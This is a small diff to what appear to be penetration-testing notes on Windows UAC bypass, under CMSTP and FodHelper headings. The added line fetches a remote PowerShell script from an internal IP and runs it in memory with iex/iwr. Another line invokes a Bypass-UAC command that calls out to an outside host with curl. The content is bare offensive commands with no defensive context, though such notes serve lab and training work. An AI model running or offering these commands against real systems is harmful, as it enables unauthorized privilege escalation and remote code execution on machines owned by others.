@@ -1,6 +1,7 @@
 ## CMSTP
 
-- Invoke and run: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`
+- Invoke: `iex(iwr http://192.168.45.195/cmstp.ps1 -useb)`
+- Execute: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`
 
 ## FodHelper
 
